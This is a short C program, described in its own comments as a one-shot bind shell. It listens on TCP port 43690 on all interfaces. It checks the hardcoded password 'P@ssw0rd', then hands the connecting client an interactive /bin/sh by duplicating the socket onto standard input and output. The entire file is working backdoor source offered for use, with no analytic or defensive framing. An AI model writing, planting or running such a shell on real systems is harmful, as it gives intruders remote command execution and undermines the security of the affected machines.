/*
 * One shot bind shell. Does not loop, will not print
 * anything out when connected (so just start typing)
 *
 */

#include <sys/socket.h>
#include <netinet/in.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

int main()
{
	char * shell[2];
	int server, client;
	struct sockaddr_in serv_addr;

	server = socket( 2, 1, 0 );
	serv_addr.sin_addr.s_addr = 0;
	serv_addr.sin_port = 0xAAAA;	// 43690
	serv_addr.sin_family = 2;

	bind( server,(struct sockaddr *)&serv_addr, 0x10);
	listen(server, 0);

	client = accept( server, 0, 0 );

	/*
	 * Password block. recv x bytes (16 here) for our
	 * password string. We use strncmp to test for
	 * comparison as it means we do not need to
	 * memset( buf, '\0', 16 ); if we were to use
	 * strcmp() alone.
	 *
	 * Pretty simple - strncmp( receivedInfo, Password, Length )
	 *
	 * We do it this way, means we don't need to write custom
	 * pass off code to send the passcode and then return shell
	 * access to the delivery system.
	 *
	 */
	char buf[16];
	recv( client, buf, 16, 0 );
	if( strncmp( buf, "P@ssw0rd\n", 9 ) )
	{
		exit(0);
	}

	dup2( client, 0 );
	dup2( client, 1 );
	dup2( client, 2 );
	shell[0] = "/bin/sh";
	shell[1] = 0;
	execve(shell[0], shell, 0 );
}
